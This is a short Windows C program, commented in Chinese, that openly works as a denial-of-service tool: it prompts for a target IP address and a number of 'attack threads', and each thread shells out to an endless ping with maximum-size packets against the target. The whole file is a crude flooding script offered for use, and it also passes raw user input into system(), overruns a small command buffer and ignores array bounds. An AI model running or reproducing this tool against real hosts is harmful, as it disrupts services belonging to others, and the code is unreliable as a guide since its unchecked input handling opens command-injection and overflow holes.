#include <stdio.h>
#include <windows.h>

#define MaxSize 50
#define MaxThreadNum 128

HANDLE ThreadHandle[MaxThreadNum]; //线程句柄
DWORD ThreadID[MaxThreadNum];      //线程ID

DWORD WINAPI DDosServer(LPVOID IP_Address)
{
    char Command[MaxSize] = "ping \0";
    char *IP = (char *)IP_Address;
    strcat(Command, IP);
    //拼接ping命令参数(方式、缓冲区大小、请求数)
    strcat(Command, " -t -l 65500\0");
    //执行ping命令
    system(Command);
    return 0;
}
int main()
{
    int ThreadNum = 8;
    char IP[16] = {0};
    //输入目标主机IP
    printf("请输入目标主机IP: ");
    scanf("%s", IP);
    printf("请输入攻击线程数：");
    scanf("%d", &ThreadNum);
    for (int i = 0; i < ThreadNum; ++i)
    {
        ThreadHandle[i] = CreateThread(NULL, 0, DDosServer, &IP, 0, &ThreadID[i]);
        if (ThreadHandle != NULL)
            printf("攻击线程%d创建成功！\n", i);
        else
            printf("攻击线程%d创建失败！\n", i);
    }
    //等待全部线程结束
    WaitForMultipleObjects(ThreadNum, ThreadHandle, TRUE, INFINITE);
    for (int i = 0; i < ThreadNum; ++i)
    {
        //关闭线程句柄
        //TerminateThread(ThreadHandle[i], 0);
        if (CloseHandle(ThreadHandle[i]) == true)
            printf("攻击线程%d结束成功！\n", i);
    }
    return 0;
}